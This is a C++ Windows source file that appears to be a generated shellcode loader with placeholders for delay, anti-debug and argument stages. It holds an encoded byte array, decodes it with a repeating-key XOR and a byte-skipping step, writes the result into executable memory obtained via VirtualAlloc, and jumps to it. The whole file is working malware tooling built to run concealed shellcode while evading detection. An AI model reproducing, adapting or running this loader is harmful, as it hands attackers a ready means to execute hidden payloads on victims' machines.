#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>



//####DEFINE####

int xor_encode_e862a7a835274b6682f6138af446f62b(unsigned char* data, int data_len)
{
    const char* key = "WYI2fCzhY9jv";
    int key_len = 12;
    
    printf("\n");
    printf("DEBUG:Before XOR:");
    printf("key %s \n", key);
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    for (int i = 0; i < data_len; i++){
        data[i] = (data[i] ^ (unsigned char)key[i % key_len]);
    }


    printf("\n");
    printf("DEBUG:After XOR:");
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", data[i]);
    }
    printf("\n\n");

    return data_len;
}
int nop_decode_0a394ac5e7284ce69bd6fe8468710dd5(unsigned char* encoded, int length)
{
    int data_len = 0;
    for (int i = 0; i < length; i++) {
        if (i % 2 == 0){
            encoded[data_len] = encoded[i];
            data_len++;
        }
    }

    printf("\n");
    printf("DEBUG:After NOP:");
    for (size_t i = 0; i < data_len; i++) {
        printf("0x%02x,", encoded[i]);
    }
    printf("\n\n");

    return data_len;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0xab,0xc9,0x01,0xa2,0xe5,0xd3,0x9e,0xf8,0xa9,0xa9,0x82,0xe6,0x97,0xc9,0x49,0xa2,0x66,0xd3,0x7a,0xf8,0x18,0xa9,0x3b,0xe6,0x16,0xc9,0x19,0xa2,0x34,0xd3,0x2b,0xf8,0x0f,0xa9,0x22,0xe6,0x66,0xc9,0x9b,0xa2,0x03,0xd3,0x32,0xf8,0xd2,0xa9,0x38,0xe6,0x37,0xc9,0x01,0xa2,0xed,0xd3,0x28,0xf8,0x41,0xa9,0x22,0xe6,0xdc,0xc9,0x1b,0xa2,0x46,0xd3,0x32,0xf8,0xd2,0xa9,0x18,0xe6,0x07,0xc9,0x01,0xa2,0x69,0xd3,0xcd,0xf8,0x13,0xa9,0x20,0xe6,0x1a,0xc9,0x78,0xa2,0xaf,0xd3,0x32,0xf8,0x68,0xa9,0xaa,0xe6,0xfb,0xc9,0x75,0xa2,0x07,0xd3,0x06,0xf8,0x5b,0xa9,0x46,0xe6,0x77,0xc9,0x08,0xa2,0xa7,0xd3,0xb3,0xf8,0x54,0xa9,0x2b,0xe6,0x56,0xc9,0x88,0xa2,0x84,0xd3,0x97,0xf8,0x0b,0xa9,0x2b,0xe6,0x06,0xc9,0x01,0xa2,0xed,0xd3,0x28,0xf8,0x79,0xa9,0xe1,0xe6,0x15,0xc9,0x75,0xa2,0x2e,0xd3,0x7b,0xf8,0x89,0xa9,0xe1,0xe6,0xd7,0xc9,0xc1,0xa2,0x66,0xd3,0x7a,0xf8,0x59,0xa9,0x22,0xe6,0xd2,0xc9,0x89,0xa2,0x12,0xd3,0x1d,0xf8,0x11,0xa9,0x6b,0xe6,0x87,0xc9,0x19,0xa2,0xed,0xd3,0x32,0xf8,0x41,0xa9,0x2e,0xe6,0xdc,0xc9,0x09,0xa2,0x46,0xd3,0x33,0xf8,0x58,0xa9,0xba,0xe6,0xb4,0xc9,0x1f,0xa2,0x2e,0xd3,0x85,0xf8,0x90,0xa9,0x2b,0xe6,0xdc,0xc9,0x7d,0xa2,0xee,0xd3,0x32,0xf8,0x58,0xa9,0xbc,0xe6,0x1a,0xc9,0x78,0xa2,0xaf,0xd3,0x32,0xf8,0x68,0xa9,0xaa,0xe6,0xfb,0xc9,0x08,0xa2,0xa7,0xd3,0xb3,0xf8,0x54,0xa9,0x2b,0xe6,0x56,0xc9,0x88,0xa2,0x5e,0xd3,0x9a,0xf8,0x2c,0xa9,0x9b,0xe6,0x1b,0xc9,0x4a,0xa2,0x2a,0xd3,0x5e,0xf8,0x51,0xa9,0x2f,0xe6,0x6e,0xc9,0x98,0xa2,0x13,0xd3,0xa2,0xf8,0x01,0xa9,0x2e,0xe6,0xdc,0xc9,0x09,0xa2,0x42,0xd3,0x33,0xf8,0x58,0xa9,0xba,0xe6,0x31,0xc9,0x08,0xa2,0xed,0xd3,0x76,0xf8,0x11,0xa9,0x2e,0xe6,0xdc,0xc9,0x09,0xa2,0x7a,0xd3,0x33,0xf8,0x58,0xa9,0xba,0xe6,0x16,0xc9,0xc2,0xa2,0x62,0xd3,0xf2,0xf8,0x11,0xa9,0x6b,0xe6,0x87,0xc9,0x08,0xa2,0x3e,0xd3,0x3b,0xf8,0x01,0xa9,0x34,0xe6,0x0e,0xc9,0x13,0xa2,0x27,0xd3,0x22,0xf8,0x18,0xa9,0x33,0xe6,0x16,0xc9,0x13,0xa2,0x2e,0xd3,0xf9,0xf8,0xb5,0xa9,0x4a,0xe6,0x16,0xc9,0x1b,0xa2,0x99,0xd3,0x9a,0xf8,0x01,0xa9,0x2b,0xe6,0x0e,0xc9,0x13,0xa2,0x2e,0xd3,0xf1,0xf8,0x4b,0xa9,0x83,0xe6,0x00,0xc9,0xb6,0xa2,0x99,0xd3,0x85,0xf8,0x04,0xa9,0x22,0xe6,0xed,0xc9,0x48,0xa2,0x66,0xd3,0x7a,0xf8,0x59,0xa9,0x6a,0xe6,0x57,0xc9,0x49,0xa2,0x66,0xd3,0x32,0xf8,0xd4,0xa9,0xe7,0xe6,0x56,0xc9,0x48,0xa2,0x66,0xd3,0x7a,0xf8,0x18,0xa9,0xd0,0xe6,0x66,0xc9,0xc2,0xa2,0x09,0xd3,0xfd,0xf8,0xa6,0xa9,0xbf,0xe6,0xec,0xc9,0xb9,0xa2,0xd3,0xd3,0xd8,0xf8,0x0f,0xa9,0x2b,0xe6,0xed,0xc9,0xef,0xa2,0xf3,0xd3,0xc7,0xf8,0xc4,0xa9,0x95,0xe6,0x82,0xc9,0x01,0xa2,0xe5,0xd3,0xbe,0xf8,0x71,0xa9,0x56,0xe6,0x51,0xc9,0x35,0xa2,0x6c,0xd3,0xfa,0xf8,0xa2,0xa9,0x8a,0xe6,0x22,0xc9,0x4c,0xa2,0xdd,0xd3,0x3d,0xf8,0x4a,0xa9,0x18,0xe6,0x38,0xc9,0x23,0xa2,0x66,0xd3,0x23,0xf8,0x18,0xa9,0xe3,0xe6,0x8d,0xc9,0xb6,0xa2,0xb3,0xd3,0x19,0xf8,0x38,0xa9,0x06,0xe6,0x34,0xc9,0x67,0xa2,0x03,0xd3,0x02,0xf8,0x3c,0xa9,0x6a,0xe6};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = xor_encode_e862a7a835274b6682f6138af446f62b(encoded, length);length = nop_decode_0a394ac5e7284ce69bd6fe8468710dd5(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
